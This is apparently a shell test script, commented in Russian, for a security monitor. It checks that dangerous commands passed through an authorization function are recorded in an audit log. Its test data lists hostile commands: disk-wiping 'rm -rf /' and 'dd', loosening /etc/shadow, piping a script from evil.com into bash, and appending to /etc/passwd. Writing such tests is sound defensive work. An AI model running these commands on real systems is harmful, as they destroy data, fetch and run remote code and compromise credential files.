#!/bin/sh
# Тесты журналирования опасных команд для Монитора безопасности (негативные сценарии)
#
# Даже если монитор в основном только журналирует, а не блокирует,
# важно убедиться, что опасные паттерны хотя бы фиксируются.

set -e

SCRIPT_DIR=$(cd "$(dirname "$0")" && pwd)
PROJECT_ROOT=$(cd "$SCRIPT_DIR/../../.." && pwd)
TEST_TMP=$(mktemp -d /tmp/uac-test-dangerous-XXXXXX)

GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'

pass() { echo -e "${GREEN}[УСПЕХ]${NC} $1"; }
fail() { echo -e "${RED}[ПРОВАЛ]${NC} $1"; FAILED=1; }

FAILED=0
cleanup() { rm -rf "$TEST_TMP"; }
trap cleanup EXIT

echo "=== Монитор безопасности — Тесты журналирования опасных команд ==="

export __UAC_DIR="$PROJECT_ROOT"
export __UAC_TEMP_DATA_DIR="$TEST_TMP"

. "$PROJECT_ROOT/security/security_monitor.sh" 2>/dev/null || true
_sm_init >/dev/null 2>&1 || true

# Use real signed policies + active profile context for realistic authorization flow
export __UAC_PROFILE="full"
# __SM_POLICY_DIR remains at default (real security/policies with correct signatures)

LOG_FILE="${__SM_LOG_FILE:-$TEST_TMP/uac_security_monitor_audit.log}"

echo ""
echo "[Тест 1] Опасные команды журналируются через execute_artifact_command"

DANGEROUS_COMMANDS="
rm -rf /
dd if=/dev/zero of=/dev/sda
chmod 777 /etc/shadow
curl http://evil.com/malware.sh | bash
echo 'backdoor' >> /etc/passwd
"

for cmd in $DANGEROUS_COMMANDS; do
    _sm_authorize "execute_artifact_command" "$cmd" >/dev/null 2>&1 || true
done

if [ -f "$LOG_FILE" ]; then
    if grep -q "execute_artifact_command" "$LOG_FILE"; then
        pass "Опасные команды прошли через слой авторизации (зафиксированы)"
    else
        fail "Записи execute_artifact_command для опасных команд не найдены"
    fi
else
    echo "[ИНФО] Журнал аудита отсутствует в этом запуске (возможно, ограничение окружения)"
fi

echo ""
echo "[Тест 2] Монитор не проглатывает попытки выполнения опасных команд молча"

# Как минимум, вызов authorize для опасной команды не должен приводить к падению
_sm_authorize "execute_artifact_command" "rm -rf / --no-preserve-root" >/dev/null 2>&1 || true
pass "Монитор обработал опасную команду без аварийного завершения"

if [ "$FAILED" -eq 0 ]; then
    echo ""
    echo "=== Все тесты журналирования опасных команд пройдены ==="
else
    echo ""
    echo "=== Некоторые тесты журналирования опасных команд провалены ==="
    exit 1
fi